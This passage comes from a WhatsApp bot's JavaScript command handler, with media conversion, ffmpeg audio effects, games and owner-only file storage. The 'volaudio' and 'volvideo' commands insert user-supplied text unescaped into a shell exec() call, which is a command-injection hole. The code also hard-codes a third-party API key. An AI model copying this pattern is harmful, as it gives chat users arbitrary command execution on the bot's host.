                let media = await nyanBot2.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                nyanBot2.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await StickWait()
                let media = await nyanBot2.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await nyanBot2.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await StickWait()
                let media = await nyanBot2.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
                await StickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await nyanBot2.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return reply(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await nyanBot2.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return reply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                    nyanBot2.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                    nyanBot2.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                   nyanBot2.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return reply(`Example:\n${prefix}fliptext dgxeon`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return reply(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await nyanBot2.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await nyanBot2.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
nyanBot2.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
media = await nyanBot2.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
nyanBot2.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await StickWait()
                let media = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                nyanBot2.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
reply(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    reply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await nyanBot2.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await nyanBot2.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        nyanBot2.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        reply(`Session TicTacToe🎮 tidak ada`)
                    } else mewReply('?')
                } catch (e) {
                    reply('rusak')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return reply(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
                this.suit[id] = {
                    chat: await nyanBot2.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) nyanBot2.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) reply(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                nyanBot2.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'ai': 
            case 'ask':
            case 'openai': {
               if (db.data.users[sender].limit < 1) return reply(mess.limit)
	            if (!q) return reply(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await reply(isi)
			   }
			   break
    case 'xxqc': {
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await nyanBot2.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
nyanBot2.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    case 'ephemeral': {
                if (!m.isGroup) return StickGroup()
                if (!isBotAdmins) return StickBotAdmin()
                if (!isAdmins) return StickAdmin()
                if (!text) return reply('Enter the value enable/disable')
                if (args[0] === 'on') {
                    await nyanBot2.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await reply(`Done`)
                } else if (args[0] === 'off') {
                    await nyanBot2.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await reply(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 nyanBot2.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!isSamu) return StickOwner()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  reply(`${command} is disabled`)
               }
            }
            break
    case 'anticall': {
             if (!isSamu) return StickOwner()
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  anticall = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  reply(`${command} is disabled`)
               }
            }
            break
             break
case 'addvideo':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Whats the video name?')
if (VideoNyan.includes(q)) return reply("The name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
VideoNyan.push(q)
await fsx.copy(delb, `./Media/video/${q}.mp4`)
fs.writeFileSync('./Media/database/xeonvideo.json', JSON.stringify(VideoNyan))
fs.unlinkSync(delb)
reply(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Enter the video name')
if (!VideoNyan.includes(q)) return reply("The name does not exist in the database")
let wanu = VideoNyan.indexOf(q)
VideoNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/xeonvideo.json', JSON.stringify(VideoNyan))
fs.unlinkSync(`./Media/video/${q}.mp4`)
reply(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoNyan) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNyan.length}*`
reply(teks)
}
break
case 'addimage':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Whats the image name?')
if (ImageNyan.includes(q)) return reply("The name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
ImageNyan.push(q)
await fsx.copy(delb, `./Media/image/${q}.jpg`)
fs.writeFileSync('./Media/database/xeonimage.json', JSON.stringify(ImageNyan))
fs.unlinkSync(delb)
reply(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Enter the image name')
if (!ImageNyan.includes(q)) return reply("The name does not exist in the database")
let wanu = ImageNyan.indexOf(q)
ImageNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/xeonimage.json', JSON.stringify(ImageNyan))
fs.unlinkSync(`./Media/image/${q}.jpg`)
reply(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNyan) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNyan.length}*`
reply(teks)
}
break
case 'addsticker':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Whats the sticker name?')
if (Stickers.includes(q)) return reply("The name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
Stickers.push(q)
await fsx.copy(delb, `./Media/sticker/${q}.webp`)
fs.writeFileSync('./Media/database/stickers.json', JSON.stringify(Stickers))
fs.unlinkSync(delb)
reply(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Enter the sticker name')
if (!Stickers.includes(q)) return reply("The name does not exist in the database")
let wanu = Stickers.indexOf(q)
Stickers.splice(wanu, 1)
fs.writeFileSync('./Media/database/stickers.json', JSON.stringify(Stickers))
fs.unlinkSync(`./Media/sticker/${q}.webp`)
reply(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of Stickers) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${Stickers.length}*`
reply(teks)
}
break
case 'addmsg': {
	if (!isSamu) return StickOwner()
                if (!m.quoted) return reply('Reply Message You Want To Save In Database')
                if (!text) return reply(`Example : ${prefix + command} filename`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return reply(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return reply(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
                nyanBot2.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!isSamu) return StickOwner()
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'addvn':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Whats the audio name?')
if (VoiceNoteNyan.includes(q)) return reply("The name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
VoiceNoteNyan.push(q)
await fsx.copy(delb, `./Media/audio/${q}.mp3`)
fs.writeFileSync('./Media/database/xeonvn.json', JSON.stringify(VoiceNoteNyan))
fs.unlinkSync(delb)
reply(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!isSamu) return StickOwner()
if (args.length < 1) return reply('Enter the vn name')
if (!VoiceNoteNyan.includes(q)) return reply("The name does not exist in the database")
let wanu = VoiceNoteNyan.indexOf(q)
VoiceNoteNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/xeonvn.json', JSON.stringify(VoiceNoteNyan))
fs.unlinkSync(`./Media/audio/${q}.mp3`)
reply(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteNyan) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteNyan.length}*`
reply(teks)
}
break
case 'addzip':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply(`What's the zip name?`)
let teks = `${text}`
{
if (ZipNyan.includes(teks)) return reply("This name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
ZipNyan.push(teks)
await fsx.copy(delb, `./Media/zip/${teks}.zip`)
fs.writeFileSync('./Media/database/zip.json', JSON.stringify(ZipNyan))
fs.unlinkSync(delb)
reply(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipNyan.includes(teks)) return reply("This name does not exist in the database")
let wanu = ZipNyan.indexOf(teks)
ZipNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/zip.json', JSON.stringify(ZipNyan))
fs.unlinkSync(`./Media/zip/${teks}.zip`)
reply(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipNyan) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipNyan.length}*`
reply(teksooooo)
}
break
case 'addapk':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply('What is the name of the apk?')
let teks = `${text}`
{
if (ApkNyan.includes(teks)) return reply("This name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./Media/apk/${teks}.apk`)
fs.writeFileSync('./Media/database/apk.json', JSON.stringify(ApkNyan))
fs.unlinkSync(delb)
reply(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply('Name of the apk?')
let teks = `${text}`
{
if (!ApkNyan.includes(teks)) return reply("This name does not exist in the database")
let wanu = ApkNyan.indexOf(teks)
ApkNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/apk.json', JSON.stringify(ApkNyan))
fs.unlinkSync(`./Media/apk/${teks}.apk`)
reply(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkNyan) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkNyan.length}`
reply(teksoooooo)
}
break
case 'addpdf':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply('What is the name of the pdf')
let teks = `${text}`
{
if (DocNyan.includes(teks)) return reply("This name is already in use")
let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
DocNyan.push(teks)
await fsx.copy(delb, `./Media/doc/${teks}.pdf`)
fs.writeFileSync('./Media/database/doc.json', JSON.stringify(DocNyan))
fs.unlinkSync(delb)
reply(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isSamu) return StickOwner()

if (args.length < 1) return reply('Enter the name')
let teks = `${text}`
{
if (!DocNyan.includes(teks)) return reply("This name does not exist in the database")
let wanu = DocNyan.indexOf(teks)
DocNyan.splice(wanu, 1)
fs.writeFileSync('./Media/database/doc.json', JSON.stringify(DocNyan))
fs.unlinkSync(`./Media/doc/${teks}.pdf`)
reply(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocNyan) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocNyan.length}*`
reply(teksoooo)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
nyanBot2_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
